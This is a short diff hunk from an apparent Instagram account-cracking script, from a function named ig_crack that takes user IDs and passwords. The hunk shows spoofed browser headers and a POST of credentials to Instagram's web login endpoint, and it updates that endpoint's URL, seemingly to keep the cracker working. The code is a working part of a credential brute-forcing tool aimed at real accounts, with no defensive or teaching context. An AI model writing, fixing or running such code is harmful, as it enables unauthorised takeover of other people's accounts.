@@ -269,7 +269,7 @@ def ig_crack(uid, pww, total_idz):
             'x-requested-with': 'XMLHttpRequest',
             'x-web-device-id': '048502C5-4001-4BB4-8654-5B1CB4BB691E',
             'x-web-session-id': 'r64lx4:120e92:xjxzru',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/?hl=en'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             session_cookies = response.cookies.get_dict()
             if response.status_code == 200:
